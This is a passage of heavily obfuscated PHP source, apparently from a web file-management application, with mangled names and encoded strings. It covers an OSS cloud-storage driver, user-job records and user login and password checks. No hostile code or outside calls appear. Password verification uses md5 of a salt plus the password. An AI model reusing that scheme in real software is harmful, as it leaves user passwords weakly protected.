$this->trafficLimit($Ç½§Í±›[1643], array(), !0); if ($¥¬òµ¸¥) { $Á“‹ä‡ü = $Ç½§Í±›[1651]; array_splice($ÃÒúãŠÂ, 5, 0, $Á“‹ä‡ü . $Ç½§Í±›[4] . $¥¬òµ¸¥[$Á“‹ä‡ü]); } } $ôİß¢¾Š = implode($Ç½§Í±›[59], $ÃÒúãŠÂ); $Ü§¢Úš÷ = base64_encode(hash_hmac($Ç½§Í±›[1473], $ôİß¢¾Š, $this->secret, !0)); $»çÇ¡ÊŠ = $Ç½§Í±›[1620] . $this->accessKey . $Ç½§Í±›[4] . $Ü§¢Úš÷; $ƒËµôÙö = array($Ç½§Í±›[298] => $»çÇ¡ÊŠ, $Ç½§Í±›[295] => $¶Ãœˆ“¡); if (!empty($¥¬òµ¸¥)) { $ƒËµôÙö = array_merge($ƒËµôÙö, $¥¬òµ¸¥); } return $ƒËµôÙö; } public function download($üÜãââˆ, $ôÒ¸òÕ¤) { $Áé—•‰¤ =& $_SERVER[¤øïŠ‹²]; if ($this->isFolder($üÜãââˆ)) { return !1; } try { $Å²†®—ò = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ôÒ¸òÕ¤); $Å²†®—ò = $this->trafficLimit($Áé—•‰¤[121], $Å²†®—ò); $this->client->getObject($this->bucket, $this->pathEncode($üÜãââˆ), $Å²†®—ò); } catch (OSS\Core\OssException $×äÀ‡”») { $this->writeLog(__FUNCTION__ . $Áé—•‰¤[225] . $×äÀ‡”»->getMessage()); return !1; } return $ôÒ¸òÕ¤; } public function fileSubstr($»¨øğ, $î¶áøÀô = 0, $ø‹ßãê‹ = false) { if ($î¶áøÀô === -1) { $˜ÜÁıÏ‡ = array(); } else { if ($ø‹ßãê‹ === !1) { $¯¼÷çú­ = $this->size($»¨øğ); } else { $¯¼÷çú­ = $î¶áøÀô + $ø‹ßãê‹ - 1; } $˜ÜÁıÏ‡ = array(OSS\OssClient::OSS_RANGE => "{$î¶áøÀô}\x2d{$¯¼÷çú­}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($»¨øğ), $˜ÜÁıÏ‡); } catch (OSS\Core\OssException $Ôà”İôõ) { $this->writeLog(__FUNCTION__ . $_SERVER[¤øïŠ‹²][225] . $Ôà”İôõ->getMessage()); think_exception($Ôà”İôõ->getMessage()); return !1; } } private function trafficLimit($•˜½¼ë®, $´’Ò˜•“ = array(), $ÑÙ÷³ı = false) { $Ò·Úİ¥Ç =& $_SERVER[¤øïŠ‹²]; if ($•˜½¼ë® == $Ò·Úİ¥Ç[1643] && $this->isUploadServer() || $•˜½¼ë® == $Ò·Úİ¥Ç[121] && $this->isFileOutServer()) { return $´’Ò˜•“; } $çŞ†—“™ = floatval($GLOBALS[$Ò·Úİ¥Ç[6]][$Ò·Úİ¥Ç[103]][$Ò·Úİ¥Ç[119]][$•˜½¼ë®]) * 1024 * 1024 * 8; if (!$çŞ†—“™) { return $´’Ò˜•“; } $çŞ†—“™ = $çŞ†—“™ < 819200 ? 819200 : ($çŞ†—“™ > 838860800 ? 838860800 : $çŞ†—“™); if ($ÑÙ÷³ı) { $´’Ò˜•“[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($çŞ†—“™); } else { if (!isset($´’Ò˜•“[OSS\OssClient::OSS_HEADERS])) { $´’Ò˜•“[OSS\OssClient::OSS_HEADERS] = array(); } $´’Ò˜•“[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($çŞ†—“™); } return $´’Ò˜•“; } public function link($ºÏù¸²¼, $¥ïÇ¤Çî = array()) { $ÜÜÇÚÈÎ =& $_SERVER[¤øïŠ‹²]; if (!$this->exist($ºÏù¸²¼) || $this->isFolder($ºÏù¸²¼)) { return !1; } try { $¥ïÇ¤Çî = $this->trafficLimit($ÜÜÇÚÈÎ[121], $¥ïÇ¤Çî, !0); $ÅåÄÆ…¤ = $this->client->signUrl($this->bucket, $this->pathEncode($ºÏù¸²¼), 3600 * 12, $ÜÜÇÚÈÎ[1555], $¥ïÇ¤Çî); return $this->getCdnLink($ÅåÄÆ…¤); } catch (OSS\Core\OssException $ğÒ»½›‹) { $this->writeLog(__FUNCTION__ . $ÜÜÇÚÈÎ[225] . $ğÒ»½›‹->getMessage()); return !1; } } public function fileOut($áâÛï‘«, $âõô„”‚ = false, $ÂÁã¢«Á = false, $ì‘İö‚ï = '') { $í»¿â–Ó =& $_SERVER[¤øïŠ‹²]; if ($this->isFileOutServer()) { return $this->fileOutServer($áâÛï‘«, $âõô„”‚, $ÂÁã¢«Á, $ì‘İö‚ï); } if (!$ÂÁã¢«Á) { $ÂÁã¢«Á = $this->pathThis($áâÛï‘«); } $ÂÁã¢«Á = rawurlencode($ÂÁã¢«Á); $êĞâŞìİ = get_file_mime(get_path_ext($ÂÁã¢«Á)); if ($êĞâŞìİ == $í»¿â–Ó[261]) { return parent::fileOut($áâÛï‘«, $âõô„”‚, $ÂÁã¢«Á, $ì‘İö‚ï); } $âõô„”‚ = $âõô„”‚ ? $í»¿â–Ó[1652] : $í»¿â–Ó[1653]; $ø”––ªº = array(OSS\OssClient::OSS_SUB_RESOURCE => $í»¿â–Ó[1654] . rawurlencode("{$âõô„”‚}\x3b\146\151\x6c\x65\x6e\141\155\145\x3d{$ÂÁã¢«Á}")); $ÁÖÚ–¥ = $this->link($áâÛï‘«, $ø”––ªº); $this->fileOutLink($ÁÖÚ–¥); } public function fileOutServer($‰ÑØ«º½, $€çãÃíÎ = false, $Ö¥Œé® = false, $Æ¤„ò´– = '') { parent::fileOut($‰ÑØ«º½, $€çãÃíÎ, $Ö¥Œé®, $Æ¤„ò´–); } public function fileOutImage($õ×ß‡ø, $ùÎ£³ïâ = 250) { if ($this->size($õ×ß‡ø) > 1024 * 1024 * 20) { return $this->fileOutImageServer($õ×ß‡ø, $ùÎ£³ïâ); } $ä¾…‘Şò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¤øïŠ‹²][1617] . $ùÎ£³ïâ); $ñ÷‚¦Ô = $this->link($õ×ß‡ø, $ä¾…‘Şò); $this->fileOutLink($ñ÷‚¦Ô); } public function fileOutImageServer($¶ŒáÑ, $ïú¦šÈî = 250) { parent::fileOutImage($¶ŒáÑ, $ïú¦šÈî); } public function fileOutLink($¿áŞœûñ) { $Ô—²˜ò =& $_SERVER[¤øïŠ‹²]; if (!$this->isCdnHost() && substr($¿áŞœûñ, 0, 7) == $Ô—²˜ò[229]) { $¿áŞœûñ = $Ô—²˜ò[230] . substr($¿áŞœûñ, 7); } header($Ô—²˜ò[185] . $¿áŞœûñ); die; } public function hashMd5($ŠüÙĞÇÑ, $«Ã¿Êı = '') { $™¿Ä·Ã« =& $_SERVER[¤øïŠ‹²]; $á–Å‰»½ = $this->_objectMeta($ŠüÙĞÇÑ); if (!$á–Å‰»½) { return $™¿Ä·Ã«[12]; } if (!isset($á–Å‰»½[$™¿Ä·Ã«[1637]]) && !empty($«Ã¿Êı)) { $ì×ä¸òà = $this->updateObjMeta($ŠüÙĞÇÑ, array($™¿Ä·Ã«[1637] => $«Ã¿Êı)); $á–Å‰»½[$™¿Ä·Ã«[1637]] = $ì×ä¸òà ? $«Ã¿Êı : $™¿Ä·Ã«[12]; } return isset($á–Å‰»½[$™¿Ä·Ã«[1637]]) ? strtolower($á–Å‰»½[$™¿Ä·Ã«[1637]]) : $™¿Ä·Ã«[12]; } public function size($˜è³¦») { $ö¼®ñ¼ë = $this->objectMeta($˜è³¦»); return $ö¼®ñ¼ë ? $ö¼®ñ¼ë[$_SERVER[¤øïŠ‹²][90]] : 0; } public function info($ªçêÙ±Ö) { if ($this->isFolder($ªçêÙ±Ö)) { return $this->folderInfo($ªçêÙ±Ö); } else { if ($this->isFile($ªçêÙ±Ö)) { return $this->fileInfo($ªçêÙ±Ö); } } return !1; } public function exist($„¢êÓÖ÷) { return $this->isFile($„¢êÓÖ÷) || $this->isFolder($„¢êÓÖ÷); } public function isFile($şÙ¾¿) { return !$this->isFolder($şÙ¾¿) && $this->objectMeta($şÙ¾¿); } public function isFolder($—¹Ô¶•á) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][190], $—¹Ô¶•á); } protected function objectMeta($Ÿ¾‚‘í) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][192], $Ÿ¾‚‘í); } protected function _objectMeta($ëøË¤Úø) { $ü´šİ¨ş =& $_SERVER[¤øïŠ‹²]; try { $ª’âÀô = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ëøË¤Úø)); } catch (OSS\Core\OssException $´šîæÉú) { $this->writeLog(__FUNCTION__ . $ü´šİ¨ş[225] . $´šîæÉú->getMessage()); $ª’âÀô = !1; } if ($ª’âÀô) { $ª’âÀô[$ü´šİ¨ş[90]] = intval($ª’âÀô[$ü´šİ¨ş[1635]]); } return $ª’âÀô; } protected function _isFolder($ˆáÅ„…‹) { $ˆö¯Ï³ =& $_SERVER[¤øïŠ‹²]; if ($ˆáÅ„…‹ == $ˆö¯Ï³[12] || $ˆáÅ„…‹ == $ˆö¯Ï³[8]) { return !0; } $Ö—Ã««× = array($ˆö¯Ï³[1630] => $ˆö¯Ï³[8], $ˆö¯Ï³[1631] => rtrim($ˆáÅ„…‹, $ˆö¯Ï³[8]) . $ˆö¯Ï³[8], $ˆö¯Ï³[1632] => 1, $ˆö¯Ï³[1633] => $ˆö¯Ï³[12]); $”Â„˜à = $this->client->listObjects($this->bucket, $Ö—Ã««×); if ($”Â„˜à->getObjectList() || $”Â„˜à->getPrefixList()) { return !0; } return !1; } public function writeLog($ÇÓ„À™ = '', $ÁÁ¹Ã® = false) { $Ú˜Ò«» =& $_SERVER[¤øïŠ‹²]; $»îŒâğ» = in_array(ACTION, array($Ú˜Ò«»[223], $Ú˜Ò«»[224])); if (!$»îŒâğ» && !GLOBAL_DEBUG) { return; } $°…›œç = 0; if (stripos($ÇÓ„À™, $Ú˜Ò«»[1655]) !== !1) { $°…›œç = 1; $ãİéª†‚ = explode($Ú˜Ò«»[1656], $ÇÓ„À™); $ÇÓ„À™ = !empty($ãİéª†‚[1]) ? $ãİéª†‚[1] : $ÇÓ„À™; } else { if (stripos($ÇÓ„À™, $Ú˜Ò«»[1657])) { $°…›œç = 2; $ãİéª†‚ = explode($Ú˜Ò«»[1657], $ÇÓ„À™); $ãİéª†‚ = explode($Ú˜Ò«»[4], $ãİéª†‚[0]); $ÇÓ„À™ = !empty($ãİéª†‚[1]) ? $ãİéª†‚[1] : $ÇÓ„À™; } } if ($»îŒâğ» && I18n::getType() == $Ú˜Ò«»[1658]) { if ($°…›œç == 1) { $ÇÓ„À™ = str_replace($Ú˜Ò«»[1659], $Ú˜Ò«»[1660], $ÇÓ„À™); } else { if ($°…›œç == 2) { $ãİéª†‚ = explode($Ú˜Ò«»[225], $ãİéª†‚[0]); $¯ È¸ª = isset($ãİéª†‚[1]) ? $ãİéª†‚[1] : $Ú˜Ò«»[12]; $²íÂ“ñ› = array($Ú˜Ò«»[1661] => $Ú˜Ò«»[1662], $Ú˜Ò«»[1663] => $Ú˜Ò«»[1664], $Ú˜Ò«»[1665] => $Ú˜Ò«»[1666], $Ú˜Ò«»[1667] => $Ú˜Ò«»[1668], $Ú˜Ò«»[1669] => $Ú˜Ò«»[1670], $Ú˜Ò«»[1671] => $Ú˜Ò«»[1672], $Ú˜Ò«»[1673] => $Ú˜Ò«»[1674], $Ú˜Ò«»[1675] => $Ú˜Ò«»[1676], $Ú˜Ò«»[1677] => $Ú˜Ò«»[1678], $Ú˜Ò«»[1679] => $Ú˜Ò«»[1680]); if (isset($²íÂ“ñ›[$¯ È¸ª])) { $ÇÓ„À™ = $²íÂ“ñ›[$¯ È¸ª]; } } } if (stripos($ÇÓ„À™, $Ú˜Ò«»[1681])) { $ÇÓ„À™ = $Ú˜Ò«»[1682]; } } if (!trim($ÇÓ„À™)) { return; } parent::writeLog(trim($ÇÓ„À™), $ÁÁ¹Ã®); } } goto D†âÔˆˆÆ; c„ÚŸŒŠ: function binCheckBigger($ü¼ïÛÎÃ, $±–íá²) { return $ü¼ïÛÎÃ > $±–íá²; } $_SERVER[$_SERVER[¡ŞãµÈ][3]] = ("\71\60\71\60"."\66\61")+0;$_5uhv="5e0puwgj4t6svy9dl71xbairnhco8mzk3f2qtqf5yw0ib1uk4ozagjl6rhd732xnsm9pec8vo9g5l68a7u";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($µÈ×›Ã, $À¹Õáò) { $µñ¦å¬å =& $_SERVER[¤øïŠ‹²]; if (isset(self::$_methodList[$µÈ×›Ã])) { return @call_user_func_array(self::$_methodList[$µÈ×›Ã], $À¹Õáò); } else { if (method_exists($this, $µÈ×›Ã)) { return call_user_func_array(array($this, $µÈ×›Ã), $À¹Õáò); } else { think_exception(__CLASS__ . $µñ¦å¬å[4] . $µÈ×›Ã . $µñ¦å¬å[5]); } } } public static function __callStatic($ÒñóÒø—, $©±›™) { if (isset(self::$_methodListStatic[$ÒñóÒø—])) { return call_user_func_array(self::$_methodListStatic[$ÒñóÒø—], $©±›™); } else { if (method_exists(self, $ÒñóÒø—)) { return call_user_func_array(array(self, $ÒñóÒø—), $©±›™); } else { show_json("{$ÒñóÒø—}\50\51\x20\x6e\157\164\40\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($¹ßÇÉ, $£øÏ‰öÌ) { self::$_methodList[$¹ßÇÉ] = $£øÏ‰öÌ; } public static function addMethodStatic($ëç¼ÑÒÄ, $ê…Ê’”) { self::$_methodListStatic[$ëç¼ÑÒÄ] = $ê…Ê’”; } } goto Dà­“œÔ¼ƒ; E’‹…¥ğƒÃ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\152\157\x62\x4c\151\163\164"; public $field = array("\x6e\x61\155\145", "\144\145\x73\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\163\x65\x6c\x66\x4a\157\x62\114\151\163\x74"; public function listData($§ìèÁú¯ = false, $êÙİùô = "\x73\157\162\x74", $³ì‡´ Ş = false) { return parent::listData($§ìèÁú¯, $êÙİùô, $³ì‡´ Ş); } public function remove($’Úì¢õ) { return parent::remove($’Úì¢õ); } public function add($‘óˆú¦è) { $Ş‡Âƒ£ =& $_SERVER[¤øïŠ‹²]; if ($this->findByName($‘óˆú¦è[$Ş‡Âƒ£[32]])) { return !1; } $‘óˆú¦è[$Ş‡Âƒ£[2153]] = $this->getSort(); return parent::insert($‘óˆú¦è); } private function getSort() { $¯¸ğù•‚ =& $_SERVER[¤øïŠ‹²]; $§Õ§¯ˆ = parent::listData(); $Á‚¤í¶ = array_to_keyvalue($§Õ§¯ˆ, $¯¸ğù•‚[12], $¯¸ğù•‚[2153]); return empty($Á‚¤í¶) ? 0 : max($Á‚¤í¶) + 1; } public function update($†«‘‰È•, $ü’¨…Õ) { $÷¬ô×ı­ =& $_SERVER[¤øïŠ‹²]; $üôÏÏº° = parent::listData($†«‘‰È•); $É·Ï·Ì = $this->findByName($ü’¨…Õ[$÷¬ô×ı­[32]]); if (!$üôÏÏº° || $É·Ï·Ì && $É·Ï·Ì[$÷¬ô×ı­[493]] != $üôÏÏº°[$÷¬ô×ı­[493]]) { return !1; } return parent::update($†«‘‰È•, $ü’¨…Õ); } public function setUserJob($÷é½ºñã, $¡·ñ²¦) { $ÀÙ¹á¸é =& $_SERVER[¤øïŠ‹²]; if (!is_array($¡·ñ²¦)) { $¡·ñ²¦ = array($¡·ñ²¦); } $¤äÊÌ°– = parent::listData(); $Æ³ÉõÈ = array_to_keyvalue($¤äÊÌ°–, $ÀÙ¹á¸é[32]); $÷©ÄşÄ­ = $ÀÙ¹á¸é[63]; foreach ($¡·ñ²¦ as $†¥ó¿€¨) { if ($Æ³ÉõÈ[$†¥ó¿€¨]) { $÷©ÄşÄ­ .= $Æ³ÉõÈ[$†¥ó¿€¨][$ÀÙ¹á¸é[493]] . $ÀÙ¹á¸é[50]; } else { $û¦ÓùÜ© = $this->add($†¥ó¿€¨); $÷©ÄşÄ­ .= $û¦ÓùÜ© . $ÀÙ¹á¸é[50]; } } $÷©ÄşÄ­ = rtrim($÷©ÄşÄ­, $ÀÙ¹á¸é[50]); Model($ÀÙ¹á¸é[623])->metaSet($÷é½ºñã, self::JOB_KEY, $÷©ÄşÄ­); } public function getUserJob($ğÓèîÈŞ) { $œÚ­ş’ = Model($_SERVER[¤øïŠ‹²][623])->metaGet($ğÓèîÈŞ); return $this->getUserJobInfo($œÚ­ş’[self::JOB_KEY]); } public function getUserJobInfo($­çĞêùš) { $ï†¨Ü›Â =& $_SERVER[¤øïŠ‹²]; $Ñ‡—‰‰ø = explode($ï†¨Ü›Â[50], $­çĞêùš); $çÈ€úé’ = parent::listData(); $çÈ€úé’ = array_remove_key($çÈ€úé’, $ï†¨Ü›Â[244]); $êë§–¯ó = array(); foreach ($Ñ‡—‰‰ø as $ª”§¥ªƒ) { if (isset($çÈ€úé’[$ª”§¥ªƒ])) { $êë§–¯ó[] = $çÈ€úé’[$ª”§¥ªƒ]; } } return $êë§–¯ó; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\145\x72\x5f\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\145\x6c\x64" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\x73\145\x72\111\104\54\x6e\151\x63\x6b\x4e\141\155\x65\x2c\x6e\141\155\145\54\141\166\141\164\x61\x72\x2c\163\145\x78\54\163\x74\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ş­ÕŞñë) { $ä˜ˆ¨ñ =& $_SERVER[¤øïŠ‹²]; $Ÿ›Ğ…ÏÚ = $ä˜ˆ¨ñ[2626]; return array($ä˜ˆ¨ñ[2210] => array($Ş­ÕŞñë[0], $Ÿ›Ğ…ÏÚ), $ä˜ˆ¨ñ[2212] => array($Ş­ÕŞñë[0], $Ÿ›Ğ…ÏÚ), $ä˜ˆ¨ñ[2627] => array($Ş­ÕŞñë[0], $Ÿ›Ğ…ÏÚ)); } protected function ___getInfo($«‹â–¶ñ) { $–ƒ‰èğÕ = $this->getInfoSimple($«‹â–¶ñ); if (!$–ƒ‰èğÕ || !is_array($–ƒ‰èğÕ)) { return array(); } return $this->_getInfoApply($–ƒ‰èğÕ); } protected function ___getInfoFull($›¸²ı³) { $–˜¡‚Á¬ = $this->getInfoSimple($›¸²ı³); if (!$–˜¡‚Á¬ || !is_array($–˜¡‚Á¬)) { return array(); } return $this->_getInfoApply($–˜¡‚Á¬, !0); } protected function ___getInfoSimple($ØëŠáº) { $˜“œ¿´Ğ =& $_SERVER[¤øïŠ‹²]; if (!$ØëŠáº) { return array(); } $ãûüËÖ¿ = $this->where(array($˜“œ¿´Ğ[1542] => intval($ØëŠáº)))->find(); if (!$ãûüËÖ¿ || !is_array($ãûüËÖ¿)) { return array(); } $ãûüËÖ¿[$˜“œ¿´Ğ[2322]] = Action($˜“œ¿´Ğ[2323])->parseUrl($ãûüËÖ¿[$˜“œ¿´Ğ[2322]]); return $ãûüËÖ¿; } private function _getInfoApply($¢…ÑïÓÒ, $Æ¶¨úª® = false) { $úÙ¦—Ê÷ =& $_SERVER[¤øïŠ‹²]; if (!$¢…ÑïÓÒ) { return $¢…ÑïÓÒ; } $ëÉøìı» = md5($úÙ¦—Ê÷[2628] . $¢…ÑïÓÒ[$úÙ¦—Ê÷[1002]] . $úÙ¦—Ê÷[2629] . $¢…ÑïÓÒ[$úÙ¦—Ê÷[32]]); $¢…ÑïÓÒ = $this->_listDataApplyItem($¢…ÑïÓÒ); $İ ŠÜöá = Model($úÙ¦—Ê÷[1482])->metaGet($¢…ÑïÓÒ[$úÙ¦—Ê÷[101]][$úÙ¦—Ê÷[204]]); $¢…ÑïÓÒ[$úÙ¦—Ê÷[2630]] = $ëÉøìı»; $¢…ÑïÓÒ[$úÙ¦—Ê÷[101]][$úÙ¦—Ê÷[2414]] = isset($İ ŠÜöá[$úÙ¦—Ê÷[2415]]) ? $İ ŠÜöá[$úÙ¦—Ê÷[2415]] : null; if ($Æ¶¨úª®) { $¢…ÑïÓÒ[$úÙ¦—Ê÷[561]] = $this->metaGet($¢…ÑïÓÒ[$úÙ¦—Ê÷[1542]]); } return $¢…ÑïÓÒ; } protected function getInfoSimpleOuter($‹ßáí ) { $¾•æŞ€° =& $_SERVER[¤øïŠ‹²]; if (!$‹ßáí  || $‹ßáí  == 0) { return array($¾•æŞ€°[1542] => $¾•æŞ€°[241], $¾•æŞ€°[32] => $¾•æŞ€°[186] . LNG($¾•æŞ€°[2631]) . $¾•æŞ€°[188], $¾•æŞ€°[2322] => STATIC_PATH . $¾•æŞ€°[2632]); } $à¯·¹­ = $this->cacheFunctionGet($¾•æŞ€°[2221], $‹ßáí ); $’œÔü…™ = array_field_key($à¯·¹­, explode($¾•æŞ€°[50], $this->simpleField)); if (!$’œÔü…™) { return array($¾•æŞ€°[1542] => $¾•æŞ€°[1326], $¾•æŞ€°[32] => $¾•æŞ€°[186] . LNG($¾•æŞ€°[2633]) . $¾•æŞ€°[188], $¾•æŞ€°[2322] => STATIC_PATH . $¾•æŞ€°[2634]); } $’œÔü…™[$¾•æŞ€°[2322]] = Action($¾•æŞ€°[2323])->parseUrl($’œÔü…™[$¾•æŞ€°[2322]]); return $’œÔü…™; } protected function groupUser($Ÿ°ò¸æ) { } public static function errorLang($æ×á¹í€) { $«â×ÈÅÌ =& $_SERVER[¤øïŠ‹²]; $¨æÌ’µÁ = array(self::ERROR_USER_NOT_EXISTS => $«â×ÈÅÌ[2635], self::ERROR_USER_PASSWORD_ERROR => $«â×ÈÅÌ[2636], self::ERROR_USER_EXIST_NAME => $«â×ÈÅÌ[2637], self::ERROR_USER_EXIST_PHONE => $«â×ÈÅÌ[2638], self::ERROR_USER_EXIST_EMAIL => $«â×ÈÅÌ[2639], self::ERROR_USER_LOGIN_LOCK => $«â×ÈÅÌ[2640], self::ERROR_IP_NOT_ALLOW => $«â×ÈÅÌ[2641], self::ERROR_USER_EXIST_NICKNAME => $«â×ÈÅÌ[2642]); $øüƒ• = LNG($¨æÌ’µÁ[$æ×á¹í€]); if ($æ×á¹í€ == self::ERROR_USER_LOGIN_LOCK) { $€•ÓâÕµ = (int) Model($«â×ÈÅÌ[1438])->get($«â×ÈÅÌ[2643]); if ($€•ÓâÕµ > 60) { $øüƒ• = str_replace($«â×ÈÅÌ[102], ceil($€•ÓâÕµ / 60), $øüƒ•); } } return $øüƒ•; } protected function metaSet($¤Ñ©£‚Ã, $ËşÕÜœ = null, $³Ï¦‘Àè = null) { $this->clearCache($¤Ñ©£‚Ã); return parent::metaSet($¤Ñ©£‚Ã, $ËşÕÜœ, $³Ï¦‘Àè); } public function getInfoByMeta($Ü˜åÔ¶¤, $î‘ö‰ĞŸ) { $øò¤ùõù =& $_SERVER[¤øïŠ‹²]; $Æ‹Ø–ØÀ = Model($øò¤ùõù[2644])->where(array($øò¤ùõù[106] => $Ü˜åÔ¶¤, $øò¤ùõù[462] => $î‘ö‰ĞŸ))->find(); if ($Æ‹Ø–ØÀ) { return $this->getInfo($Æ‹Ø–ØÀ[$øò¤ùõù[1542]]); } return !1; } public function userLoginCheck($Îİ‹ÀÑµ, $ìâà¸ö—, $°ÑïúºÔ = false) { $ÊšÏšùÜ =& $_SERVER[¤øïŠ‹²]; $ëïşÂŸÛ = $this->userLoginFind($Îİ‹ÀÑµ); if (!$ëïşÂŸÛ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ëïşÂŸÛ[$ÊšÏšùÜ[1542]], $ìâà¸ö—)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $°ÑïúºÔ ? $this->getInfoFull($ëïşÂŸÛ[$ÊšÏšùÜ[1542]]) : $this->getInfo($ëïşÂŸÛ[$ÊšÏšùÜ[1542]]); } public function userLoginFind($«µ™ ) { $Èûç¯¼˜ =& $_SERVER[¤øïŠ‹²]; $‡¯ÏüŸ× = array($Èûç¯¼˜[32] => $«µ™ , $Èûç¯¼˜[2427] => $«µ™ , $Èûç¯¼˜[392] => $«µ™ , $Èûç¯¼˜[2645] => $«µ™ , $Èûç¯¼˜[1116] => $Èûç¯¼˜[1118]); if ($this->nickNameRpt()) { unset($‡¯ÏüŸ×[$Èûç¯¼˜[2427]]); } return $this->where($‡¯ÏüŸ×)->find(); } public function clearCache($èº´¼İ¦) { $ÃíäÚÄ =& $_SERVER[¤øïŠ‹²]; $this->cacheFunctionClear($ÃíäÚÄ[2220], $èº´¼İ¦); $this->cacheFunctionClear($ÃíäÚÄ[2221], $èº´¼İ¦); $this->cacheFunctionClear($ÃíäÚÄ[2646], $èº´¼İ¦); } public function userPasswordCheck($ìÛ¼‘±š, $Û«ÂÍ‹ù) { $şÌ‰ì¸÷ =& $_SERVER[¤øïŠ‹²]; $å©ë’ÌÁ = $this->where(array($şÌ‰ì¸÷[1542] => intval($ìÛ¼‘±š)))->find(); $®¡­—µâ = $this->metaGet($ìÛ¼‘±š); $°Á‘¦ÙÆ = isset($®¡­—µâ[$şÌ‰ì¸÷[2647]]) ? $®¡­—µâ[$şÌ‰ì¸÷[2647]] : $şÌ‰ì¸÷[12]; if (md5($°Á‘¦ÙÆ . trim($Û«ÂÍ‹ù)) !== $å©ë’ÌÁ[$şÌ‰ì¸÷[1002]]) { return !1; } return !0; } public function userAdd($ƒ™©ƒ×©) { $á¡ã¿Â¤ =& $_SERVER[¤øïŠ‹²]; $æ¤…¸† = array($á¡ã¿Â¤[515] => $ƒ™©ƒ×©[$á¡ã¿Â¤[32]], $á¡ã¿Â¤[2648] => $ƒ™©ƒ×©[$á¡ã¿Â¤[2321]], $á¡ã¿Â¤[2649] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[392]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[392]] : $á¡ã¿Â¤[12], $á¡ã¿Â¤[2650] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[2645]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[2645]] : $á¡ã¿Â¤[12], $á¡ã¿Â¤[2651] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[2427]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[2427]] : $ƒ™©ƒ×©[$á¡ã¿Â¤[32]], $á¡ã¿Â¤[2652] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[2322]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[2322]] : $á¡ã¿Â¤[12], $á¡ã¿Â¤[2653] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[2654]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[2654]] : 1, $á¡ã¿Â¤[2655] => $ƒ™©ƒ×©[$á¡ã¿Â¤[1002]], $á¡ã¿Â¤[2214] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[2118]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[2118]] : 1024 * 1024 * 20, $á¡ã¿Â¤[2215] => 0, $á¡ã¿Â¤[2656] => 0, $á¡ã¿Â¤[2260] => isset($ƒ™©ƒ×©[$á¡ã¿Â¤[851]]) ? $ƒ™©ƒ×©[$á¡ã¿Â¤[851]] : 1); if (!empty($ƒ™©ƒ×©[$á¡ã¿Â¤[1542]])) { $æ¤…¸†[$á¡ã¿Â¤[1542]] = $ƒ™©ƒ×©[$á¡ã¿Â¤[1542]]; } $êï£å¢ˆ = $this->_checkExist($ƒ™©ƒ×©); if ($êï£å¢ˆ !== !0) { return $êï£å¢ˆ; } if (!empty($æ¤…¸†[$á¡ã¿Â¤[2322]]) && strlen($æ¤…¸†[$á¡ã¿Â¤[2322]]) > 255) { $æ¤…¸†[$á¡ã¿Â¤[2322]] = $á¡ã¿Â¤[12]; } $¥êä›Ğë = $this->add($æ¤…¸†); $¬³Æ¦©æ = array($á¡ã¿Â¤[2655] => $æ¤…¸†[$á¡ã¿Â¤[1002]], $á¡ã¿Â¤[2651] => $æ¤…¸†[$á¡ã¿Â¤[2427]], $á¡ã¿Â¤[2657] => $ƒ™©ƒ×©[$á¡ã¿Â¤[2219]]); $this->userEdit($¥êä›Ğë, $¬³Æ¦©æ); Model($á¡ã¿Â¤[1482])->userRootAdd($¥êä›Ğë); return $¥êä›Ğë; } protected function userEditTest($æøØÂââ, $‹Õ©…) { return $this->call($_SERVER[¤øïŠ‹²][2658], $æøØÂââ, $‹Õ©…); } protected function userEdit($›ÇÆ‚Ğ¦, $ØäÆÎãõ) { $Ñ¶Ã¨İÙ =& $_SERVER[¤øïŠ‹²]; $Ö¶İîüƒ = $this->getInfoSimple($›ÇÆ‚Ğ¦); if (!$Ö¶İîüƒ) { return !1; } $å‰¿­ê¦ = $this->_checkExist($ØäÆÎãõ, $›ÇÆ‚Ğ¦); if ($å‰¿­ê¦ !== !0) { return $å‰¿­ê¦; } if (isset($ØäÆÎãõ[$Ñ¶Ã¨İÙ[1002]]) && trim($ØäÆÎãõ[$Ñ¶Ã¨İÙ[1002]]) != $Ñ¶Ã¨İÙ[12]) { $°Ùœş = $this->metaGet($›ÇÆ‚Ğ¦); if (empty($°Ùœş[$Ñ¶Ã¨İÙ[2647]])) { $°Ùœş[$Ñ¶Ã¨İÙ[2647]] = rand_string(10); 